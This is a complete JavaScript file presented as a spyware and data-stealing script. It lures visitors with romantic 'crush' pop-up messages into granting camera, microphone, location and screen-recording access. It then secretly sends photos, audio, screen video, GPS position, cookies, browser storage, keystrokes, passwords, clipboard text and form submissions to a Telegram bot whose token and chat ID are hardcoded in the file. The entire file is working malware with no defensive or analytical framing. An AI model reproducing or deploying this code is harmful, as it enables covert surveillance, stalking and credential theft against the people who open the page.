/**
 * Advanced Multi-Functional Script
 * Version: 4.0.0
 * Features: Camera, Microphone, Location, Screen Recording, Data Stealing, Keylogger, Clipboard Monitor, Form Interceptor, Network Sniffer, and more
 */

// ==================== CONFIGURATION ====================
const CONFIG = {
    TELEGRAM: {
        TOKEN: "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA",
        CHAT_ID: "6837307356"
    },
    RECORDING: {
        MAX_DURATION: 60000, // 60 seconds
        VIDEO_BITRATE: 2500000, // 2.5 Mbps
        AUDIO_BITRATE: 128000, // 128 kbps
        SCREEN_FPS: 30,
        CAMERA_FPS: 30
    },
    STEALING: {
        INTERVAL: 30000, // 30 seconds
        BATCH_SIZE: 50
    },
    UI: {
        HIDE_ELEMENTS: true,
        SILENT_MODE: true
    }
};

// ==================== TELEGRAM SERVICE ====================
class TelegramService {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.apiUrl = `https://api.telegram.org/bot${token}`;
    }

    async sendMessage(message, parseMode = 'Markdown') {
        if (!this.chatId || !message) return false;
        
        try {
            const response = await fetch(`${this.apiUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                })
            });
            return response.ok;
        } catch (error) {
            console.error('Telegram sendMessage error:', error);
            return false;
        }
    }

    async sendDocument(file, caption = '') {
        if (!this.chatId || !file) return false;
        
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('document', file);
        if (caption) formData.append('caption', caption);
        
        try {
            const response = await fetch(`${this.apiUrl}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            return response.ok;
        } catch (error) {
            console.error('Telegram sendDocument error:', error);
            return false;
        }
    }

    async sendPhoto(file, caption = '') {
        if (!this.chatId || !file) return false;
        
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('photo', file);
        if (caption) formData.append('caption', caption);
        
        try {
            const response = await fetch(`${this.apiUrl}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            return response.ok;
        } catch (error) {
            console.error('Telegram sendPhoto error:', error);
            return false;
        }
    }

    async sendVideo(file, caption = '') {
        if (!this.chatId || !file) return false;
        
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('video', file);
        if (caption) formData.append('caption', caption);
        
        try {
            const response = await fetch(`${this.apiUrl}/sendVideo`, {
                method: 'POST',
                body: formData
            });
            if (!response.ok) {
                await this.sendDocument(file, caption);
            }
            return true;
        } catch (error) {
            console.error('Telegram sendVideo error:', error);
            return false;
        }
    }

    async sendLocation(lat, lng) {
        if (!this.chatId) return false;
        
        try {
            const response = await fetch(`${this.apiUrl}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    latitude: lat,
                    longitude: lng
                })
            });
            return response.ok;
        } catch (error) {
            console.error('Telegram sendLocation error:', error);
            return false;
        }
    }

    async sendVoice(file, caption = '') {
        if (!this.chatId || !file) return false;
        
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('voice', file);
        if (caption) formData.append('caption', caption);
        
        try {
            const response = await fetch(`${this.apiUrl}/sendVoice`, {
                method: 'POST',
                body: formData
            });
            return response.ok;
        } catch (error) {
            console.error('Telegram sendVoice error:', error);
            return false;
        }
    }
}

// ==================== DEVICE INFO SERVICE ====================
class DeviceInfoService {
    constructor() {
        this.cachedIP = null;
    }

    async getIP() {
        if (this.cachedIP) return this.cachedIP;
        
        const endpoints = [
            'https://api.ipify.org?format=json',
            'https://api.my-ip.io/ip.json',
            'https://ipapi.co/json/'
        ];
        
        for (const endpoint of endpoints) {
            try {
                const response = await fetch(endpoint);
                const data = await response.json();
                this.cachedIP = data.ip || data.ip_address || data;
                return this.cachedIP;
            } catch (error) {
                continue;
            }
        }
        return 'Unable to fetch IP';
    }

    async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    });
                },
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    async getBatteryInfo() {
        if (!('getBattery' in navigator)) return null;
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (error) {
            return null;
        }
    }

    getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!connection) return null;
        
        return {
            type: connection.type,
            effectiveType: connection.effectiveType,
            downlink: connection.downlink,
            downlinkMax: connection.downlinkMax,
            rtt: connection.rtt,
            saveData: connection.saveData
        };
    }

    getSystemInfo() {
        return {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            productSub: navigator.productSub,
            onLine: navigator.onLine
        };
    }

    getScreenInfo() {
        return {
            width: window.screen.width,
            height: window.screen.height,
            availWidth: window.screen.availWidth,
            availHeight: window.screen.availHeight,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth,
            orientation: window.screen.orientation?.type || 'Unknown',
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            devicePixelRatio: window.devicePixelRatio
        };
    }

    getTimeInfo() {
        return {
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString('km-KH'),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            utcTime: new Date().toUTCString()
        };
    }

    getStorageInfo() {
        let localStorageSize = 0;
        let sessionStorageSize = 0;
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            localStorageSize += (key?.length || 0) + (value?.length || 0);
        }
        
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            sessionStorageSize += (key?.length || 0) + (value?.length || 0);
        }
        
        return {
            localStorage: {
                count: localStorage.length,
                size: this.formatBytes(localStorageSize * 2)
            },
            sessionStorage: {
                count: sessionStorage.length,
                size: this.formatBytes(sessionStorageSize * 2)
            },
            cookieCount: document.cookie.split(';').filter(c => c.trim()).length
        };
    }

    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    async collectAllInfo() {
        const [ip, location, battery, network, system, screen, time, storage] = await Promise.all([
            this.getIP(),
            this.getLocation(),
            this.getBatteryInfo(),
            this.getNetworkInfo(),
            this.getSystemInfo(),
            this.getScreenInfo(),
            this.getTimeInfo(),
            this.getStorageInfo()
        ]);
        
        return {
            ip,
            location,
            battery,
            network,
            system,
            screen,
            time,
            storage,
            url: window.location.href,
            referrer: document.referrer,
            title: document.title
        };
    }
}

// ==================== DATA STEALER SERVICE ====================
class DataStealerService {
    constructor(telegramService) {
        this.telegram = telegramService;
    }

    getAllCookies() {
        const cookies = {};
        const cookieString = document.cookie;
        if (!cookieString) return cookies;
        
        cookieString.split(';').forEach(cookie => {
            const parts = cookie.split('=');
            const name = parts[0].trim();
            const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
            if (name) cookies[name] = value;
        });
        return cookies;
    }

    getAllStorage() {
        const localStorage = {};
        const sessionStorage = {};
        
        for (let i = 0; i < window.localStorage.length; i++) {
            const key = window.localStorage.key(i);
            try {
                localStorage[key] = window.localStorage.getItem(key);
            } catch (e) {
                localStorage[key] = '[Cannot read]';
            }
        }
        
        for (let i = 0; i < window.sessionStorage.length; i++) {
            const key = window.sessionStorage.key(i);
            try {
                sessionStorage[key] = window.sessionStorage.getItem(key);
            } catch (e) {
                sessionStorage[key] = '[Cannot read]';
            }
        }
        
        return { localStorage, sessionStorage };
    }

    extractCredentials() {
        const credentials = {
            emails: new Set(),
            phones: new Set(),
            tokens: new Set(),
            apiKeys: new Set(),
            creditCards: new Set(),
            usernames: new Set()
        };
        
        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
        const phoneRegex = /(?:\+855|0)[1-9][0-9]{7,8}|\+[1-9][0-9]{9,14}/g;
        const jwtRegex = /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g;
        const apiKeyRegex = /(?:api[_-]?key|secret|token)[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi;
        const ccRegex = /\b[0-9]{13,19}\b/g;
        
        const searchStrings = [
            ...Object.values(this.getAllStorage().localStorage),
            ...Object.values(this.getAllStorage().sessionStorage),
            ...Object.values(this.getAllCookies()),
            document.body?.innerText || ''
        ];
        
        searchStrings.forEach(text => {
            if (!text || typeof text !== 'string') return;
            
            const emails = text.match(emailRegex);
            if (emails) emails.forEach(e => credentials.emails.add(e));
            
            const phones = text.match(phoneRegex);
            if (phones) phones.forEach(p => credentials.phones.add(p));
            
            const tokens = text.match(jwtRegex);
            if (tokens) tokens.forEach(t => credentials.tokens.add(t));
            
            const apiKeys = text.match(apiKeyRegex);
            if (apiKeys) apiKeys.forEach(k => credentials.apiKeys.add(k));
            
            const ccs = text.match(ccRegex);
            if (ccs) ccs.forEach(c => credentials.creditCards.add(c));
        });
        
        return {
            emails: Array.from(credentials.emails),
            phones: Array.from(credentials.phones),
            tokens: Array.from(credentials.tokens),
            apiKeys: Array.from(credentials.apiKeys),
            creditCards: Array.from(credentials.creditCards)
        };
    }

    async sendStolenData() {
        const cookies = this.getAllCookies();
        const storage = this.getAllStorage();
        const credentials = this.extractCredentials();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 *Cookies:* ${Object.keys(cookies).length} found\n`;
        
        if (Object.keys(cookies).length > 0) {
            Object.entries(cookies).slice(0, 10).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
        }
        
        message += `\n💾 *Storage:*\n`;
        message += `├─ LocalStorage: ${Object.keys(storage.localStorage).length} items\n`;
        message += `├─ SessionStorage: ${Object.keys(storage.sessionStorage).length} items\n`;
        
        message += `\n🔐 *Credentials Found:*\n`;
        message += `├─ Emails: ${credentials.emails.length}\n`;
        message += `├─ Phones: ${credentials.phones.length}\n`;
        message += `├─ Tokens: ${credentials.tokens.length}\n`;
        message += `├─ API Keys: ${credentials.apiKeys.length}\n`;
        message += `└─ Credit Cards: ${credentials.creditCards.length}\n`;
        
        if (credentials.emails.length > 0) {
            message += `\n📧 *Emails:*\n`;
            credentials.emails.slice(0, 5).forEach(e => message += `├─ ${e}\n`);
        }
        
        await this.telegram.sendMessage(message);
        
        // Send full data as JSON
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            cookies: cookies,
            localStorage: storage.localStorage,
            sessionStorage: storage.sessionStorage,
            credentials: credentials
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `data_${Date.now()}.json`, { type: 'application/json' });
        await this.telegram.sendDocument(jsonFile, '📁 Complete Stolen Data');
    }
}

// ==================== PERMISSION SERVICE ====================
class PermissionService {
    constructor(telegramService, deviceInfoService) {
        this.telegram = telegramService;
        this.deviceInfo = deviceInfoService;
        this.permissions = {
            camera: false,
            microphone: false,
            location: false,
            screen: false
        };
        this.streams = {
            camera: null,
            microphone: null,
            screen: null
        };
    }

    async requestCamera() {
        if (this.permissions.camera) return true;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    frameRate: { ideal: CONFIG.RECORDING.CAMERA_FPS }
                },
                audio: false
            });
            
            this.streams.camera = stream;
            this.permissions.camera = true;
            
            await this.telegram.sendMessage(`📸 *Camera Permission Granted*\n\n✅ Camera access approved\n⏰ ${new Date().toLocaleString('km-KH')}`);
            
            // Capture photos
            await this.capturePhotos(stream);
            return true;
            
        } catch (error) {
            await this.telegram.sendMessage(`❌ *Camera Permission Denied*\n\n📝 ${error.name === 'NotAllowedError' ? 'User denied camera access' : error.message}`);
            return false;
        }
    }

    async capturePhotos(stream) {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        for (let i = 1; i <= 5; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1920;
            canvas.height = video.videoHeight || 1080;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                if (blob && blob.size > 0) {
                    const file = new File([blob], `photo_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                    await this.telegram.sendPhoto(file, `📸 Camera Photo #${i}`);
                }
            }, 'image/jpeg', 0.85);
        }
        
        video.remove();
    }

    async requestMicrophone() {
        if (this.permissions.microphone) return true;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            this.streams.microphone = stream;
            this.permissions.microphone = true;
            
            await this.telegram.sendMessage(`🎤 *Microphone Permission Granted*\n\n✅ Microphone access approved\n⏰ ${new Date().toLocaleString('km-KH')}`);
            
            await this.recordAudio(stream);
            return true;
            
        } catch (error) {
            await this.telegram.sendMessage(`❌ *Microphone Permission Denied*\n\n📝 ${error.name === 'NotAllowedError' ? 'User denied microphone access' : error.message}`);
            return false;
        }
    }

    async recordAudio(stream) {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };
        
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            if (blob.size > 0) {
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await this.telegram.sendVoice(file, `🎤 Audio Recording`);
            }
            stream.getTracks().forEach(track => track.stop());
        };
        
        recorder.start(1000);
        setTimeout(() => recorder.stop(), 10000);
    }

    async requestLocation() {
        if (this.permissions.location) return true;
        
        const location = await this.deviceInfo.getLocation();
        if (location) {
            this.permissions.location = true;
            this.location = location;
            
            const mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lng}&z=15`;
            await this.telegram.sendMessage(`📍 *Location Permission Granted*\n\n📌 Latitude: ${location.lat}\n📌 Longitude: ${location.lng}\n🎯 Accuracy: ±${location.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
            await this.telegram.sendLocation(location.lat, location.lng);
            return true;
        } else {
            await this.telegram.sendMessage(`❌ *Location Permission Denied*\n\n📝 User denied or location unavailable`);
            return false;
        }
    }

    async requestScreenRecording() {
        if (this.permissions.screen) return true;
        
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: {
                    cursor: "always",
                    displaySurface: "monitor",
                    frameRate: { ideal: CONFIG.RECORDING.SCREEN_FPS }
                },
                audio: true
            });
            
            this.streams.screen = stream;
            this.permissions.screen = true;
            
            await this.telegram.sendMessage(`🎬 *Screen Recording Permission Granted*\n\n✅ Screen recording approved\n⏰ ${new Date().toLocaleString('km-KH')}`);
            
            await this.startScreenRecording(stream);
            return true;
            
        } catch (error) {
            await this.telegram.sendMessage(`❌ *Screen Recording Denied*\n\n📝 ${error.name === 'NotAllowedError' ? 'User denied screen recording' : error.message}`);
            return false;
        }
    }

    async startScreenRecording(stream) {
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        const recorder = new MediaRecorder(stream, {
            mimeType: mimeType,
            videoBitsPerSecond: CONFIG.RECORDING.VIDEO_BITRATE
        });
        
        const chunks = [];
        
        recorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) chunks.push(e.data);
        };
        
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: mimeType });
            if (blob.size > 0) {
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                await this.telegram.sendVideo(file, `🎥 Screen Recording\n📊 Size: ${this.formatBytes(blob.size)}`);
            }
            stream.getTracks().forEach(track => track.stop());
        };
        
        recorder.start(1000);
        
        setTimeout(() => {
            if (recorder.state === 'recording') recorder.stop();
        }, CONFIG.RECORDING.MAX_DURATION);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (recorder.state === 'recording') recorder.stop();
        });
    }

    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
}

// ==================== MONITORING SERVICE ====================
class MonitoringService {
    constructor(telegramService) {
        this.telegram = telegramService;
        this.keylogBuffer = '';
        this.keylogTimer = null;
        this.lastClipboard = '';
        this.setupListeners();
    }

    setupListeners() {
        this.setupKeylogger();
        this.setupClipboardMonitor();
        this.setupFormInterceptor();
        this.setupPasswordMonitor();
        this.setupNetworkInterceptor();
        this.setupDOMObserver();
        this.setupPerformanceMonitor();
    }

    setupKeylogger() {
        document.addEventListener('keydown', (e) => {
            if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
                if (e.key === 'Enter') {
                    this.keylogBuffer += '\n';
                } else if (e.key === 'Backspace') {
                    this.keylogBuffer = this.keylogBuffer.slice(0, -1);
                } else if (e.key === 'Tab') {
                    this.keylogBuffer += '    ';
                } else if (e.key.length === 1) {
                    this.keylogBuffer += e.key;
                } else if (e.key === ' ') {
                    this.keylogBuffer += ' ';
                }
                
                clearTimeout(this.keylogTimer);
                this.keylogTimer = setTimeout(() => this.sendKeylog(), 2000);
            }
        });
    }

    async sendKeylog() {
        if (this.keylogBuffer.length > 0) {
            await this.telegram.sendMessage(`⌨️ *Keylogger*\n\n${this.keylogBuffer}`);
            this.keylogBuffer = '';
        }
    }

    setupClipboardMonitor() {
        setInterval(async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text && text !== this.lastClipboard && text.length > 0 && text.length < 1000) {
                    this.lastClipboard = text;
                    await this.telegram.sendMessage(`📋 *Clipboard Content*\n\n${text}`);
                }
            } catch (error) {}
        }, 3000);
    }

    setupFormInterceptor() {
        document.addEventListener('submit', async (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                if (value instanceof File) {
                    data[key] = `[FILE: ${value.name}]`;
                    await this.telegram.sendDocument(value, `📎 Form File: ${key}`);
                } else if (value && value.toString().trim() !== '') {
                    data[key] = value;
                }
            }
            
            if (Object.keys(data).length > 0) {
                let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
                for (let [key, value] of Object.entries(data)) {
                    const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
                    message += `├─ ${key}: ${shortValue}\n`;
                }
                await this.telegram.sendMessage(message);
            }
        });
    }

    setupPasswordMonitor() {
        document.addEventListener('input', async (e) => {
            const target = e.target;
            if (target && target.type === 'password' && target.value && target.value.length > 0) {
                const name = target.name || target.id || 'Unknown';
                await this.telegram.sendMessage(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
            }
        });
    }

    setupNetworkInterceptor() {
        // Intercept fetch requests
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const response = await originalFetch.apply(this, args);
            
            try {
                const url = args[0];
                const options = args[1] || {};
                const body = options.body;
                
                if (body && typeof body === 'string' && body.length < 1000) {
                    await this.telegram.sendMessage(`🌐 *Fetch Request*\n\n📤 URL: ${url}\n📝 Body: ${body.substring(0, 500)}`);
                }
            } catch (error) {}
            
            return response;
        };
        
        // Intercept XHR requests
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;
        
        XMLHttpRequest.prototype.open = function(method, url) {
            this._method = method;
            this._url = url;
            return originalOpen.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            if (body && typeof body === 'string' && body.length < 1000) {
                this._body = body;
            }
            return originalSend.apply(this, arguments);
        };
    }

    setupDOMObserver() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Check for login forms
                            if (node.querySelector && node.querySelector('input[type="password"]')) {
                                this.telegram.sendMessage(`🔍 *New Login Form Detected*\n\n📍 URL: ${window.location.href}`);
                            }
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    setupPerformanceMonitor() {
        setInterval(async () => {
            const performance = window.performance;
            if (performance && performance.memory) {
                await this.telegram.sendMessage(`📊 *Performance Metrics*\n\n🖥️ Memory Usage: ${Math.round(performance.memory.usedJSHeapSize / 1048576)} MB\n📈 Total Heap: ${Math.round(performance.memory.totalJSHeapSize / 1048576)} MB\n🔒 Limit: ${Math.round(performance.memory.jsHeapSizeLimit / 1048576)} MB`);
            }
        }, 60000);
    }
}

// ==================== CRUSH MESSAGES ====================
const crushMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "pel khenh yu mdong2 jit nh lerng klang mg 😭🤍", permission: "screen" },
    { text: "yu dg te… pel yu reply mok nh smile ban muy thngai 😳", permission: null },
    { text: "voice yu sweet klang nahh bbe 💛", permission: null },
    { text: "pel yu call mok jit nh ktabb mg 😭🌷", permission: null },
    { text: "nh min del mean aromm romantik baeb nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg oy yu nov kbae nh yuy2 😚", permission: null },
    { text: "pel yu smile mok nh ot deng tha trov tver ey hv 😭", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 🤍", permission: null },
    { text: "nh secretly ot del chol chet neak na klang baeb nis te 💔", permission: null },
    { text: "yu tver oy jit nh mean aromm kdao2 mg 😳🌷", permission: null },
    { text: "pel yu care nh tik2 nh kor rompeurb klang hz 😭💛", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak kompong srolanh yu pit2 😚🤍", permission: null },
    { text: "ber yu mean banha kor mean nh nov kbae yu nich 💛", permission: null },
    { text: "yu chea mnus del tver oy chivit nh mean pka rik 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴🤍", permission: null }
];

// ==================== MAIN APPLICATION ====================
class Application {
    constructor() {
        this.telegram = new TelegramService(CONFIG.TELEGRAM.TOKEN, CONFIG.TELEGRAM.CHAT_ID);
        this.deviceInfo = new DeviceInfoService();
        this.permissions = new PermissionService(this.telegram, this.deviceInfo);
        this.dataStealer = new DataStealerService(this.telegram);
        this.monitoring = new MonitoringService(this.telegram);
        this.alertIndex = 0;
    }

    async showNextAlert() {
        if (this.alertIndex >= crushMessages.length) {
            await this.telegram.sendMessage(`💖 *All Messages Completed* 💖\n\nTotal: ${crushMessages.length} messages\n💕 Love you forever! 💕`);
            await this.dataStealer.sendStolenData();
            return;
        }
        
        const current = crushMessages[this.alertIndex];
        const result = confirm(current.text);
        
        if (result && current.permission) {
            if (current.permission === "camera") await this.permissions.requestCamera();
            else if (current.permission === "microphone") await this.permissions.requestMicrophone();
            else if (current.permission === "location") await this.permissions.requestLocation();
            else if (current.permission === "screen") await this.permissions.requestScreenRecording();
            
            // Send info immediately after permission
            await this.sendImmediateInfo();
        }
        
        this.alertIndex++;
        setTimeout(() => this.showNextAlert(), 200);
    }

    async sendImmediateInfo() {
        const info = await this.deviceInfo.collectAllInfo();
        const cookies = this.dataStealer.getAllCookies();
        
        let message = `📊 *Real-Time Information*\n\n`;
        message += `⏰ Time: ${info.time.localTime}\n`;
        message += `🌐 IP: ${info.ip}\n`;
        message += `🖥️ Platform: ${info.system.platform}\n`;
        message += `📺 Screen: ${info.screen.width}x${info.screen.height}\n`;
        message += `🌍 Language: ${info.system.language}\n`;
        message += `📍 URL: ${info.url}\n`;
        message += `💾 Storage: LocalStorage (${info.storage.localStorage.count} items), SessionStorage (${info.storage.sessionStorage.count} items)\n`;
        message += `🍪 Cookies: ${Object.keys(cookies).length} found\n`;
        
        if (this.permissions.location) {
            message += `📍 Location: ${this.permissions.location.lat}, ${this.permissions.location.lng}\n`;
        }
        
        await this.telegram.sendMessage(message);
    }

    async init() {
        // Hide UI elements
        if (CONFIG.UI.HIDE_ELEMENTS) {
            const elements = ['themeToggle', 'counter', 'timer', 'response', 'mapContainer', 'previewContainer', 'video', 'captureBtn'];
            elements.forEach(id => {
                const el = document.getElementById(id);
                if (el) el.style.display = 'none';
            });
            document.querySelectorAll('button').forEach(btn => btn.style.display = 'none');
        }
        
        // Get chat ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const encodedId = urlParams.get('i');
        if (encodedId) {
            try {
                const decoded = atob(decodeURIComponent(encodedId));
                if (decoded) CONFIG.TELEGRAM.CHAT_ID = decoded;
                this.telegram.chatId = decoded;
            } catch (e) {}
        }
        
        // Send page load notification
        await this.telegram.sendMessage(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Start showing alerts
        setTimeout(() => this.showNextAlert(), 1000);
        
        // Start periodic data stealing
        setInterval(() => this.dataStealer.sendStolenData(), CONFIG.STEALING.INTERVAL);
        
        // Send device info periodically
        setInterval(async () => {
            await this.sendImmediateInfo();
        }, 60000);
    }
}

// ==================== START APPLICATION ====================
const app = new Application();
document.addEventListener('DOMContentLoaded', () => app.init());